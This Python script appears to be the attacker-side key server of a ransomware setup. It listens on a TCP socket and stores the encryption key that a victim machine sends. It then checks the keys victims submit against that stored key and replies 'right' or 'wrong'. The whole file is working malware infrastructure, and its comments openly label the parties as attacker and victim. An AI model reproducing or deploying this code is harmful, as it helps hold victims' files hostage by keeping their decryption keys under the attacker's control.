import socket    # For Building TCP Connection -- AF_INET
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # We are creating a object S here.
s.bind(("10.10.10.10", 8080))                           # WE will define IP address and port number
s.listen(1)                                             # Number of connections.
print ("Listening for incoming TCP")
conn, addr = s.accept()     #Function.
print("Got a connection from {}.".format(addr))
# This function compares the key sent from the victim with that stored in the attacker machine.
def keyChecking():
    #Receiving a key from the victim.
    key=str(conn.recv(1024),"utf-8")
    # If that key is the main key then store it in a text file in the attacker.
    if key[0:2]=='K\n':
        key=key[2:]
        key_file=open('key.txt','w')
        key_file.write(key)
    # Else treat the key as the input provided by the user at the victim's end and compare it with the real key
    else:
        # This is the user input sent from the victim.
        key=bytes(key,'utf-8')
        ## This is the actual key stored in the attacker.
        key_file=open('key.txt','r')
        actual_key=key_file.read()
        actual_key=bytes(actual_key,'utf-8')
        # key---> User Input.
        # actual_key--->Real Key stored in the attacker.

        # If the actual key matches with that of the one sent by the victim.
        if(actual_key==key):
            print("He is right")
            msg="right"
            #Send that msg to the victim.
            conn.send(bytes(msg,'utf-8'))
            #Close the socket.
            conn.close()
        else:
            print ("Wrong")
            #Send a wrong msg to the vicim.
            msg="wrong"
            conn.send(bytes(msg,'utf-8'))
        
    
def main ():
    #Keep looping the key checking function.
    while(1):
        keyChecking()
main()
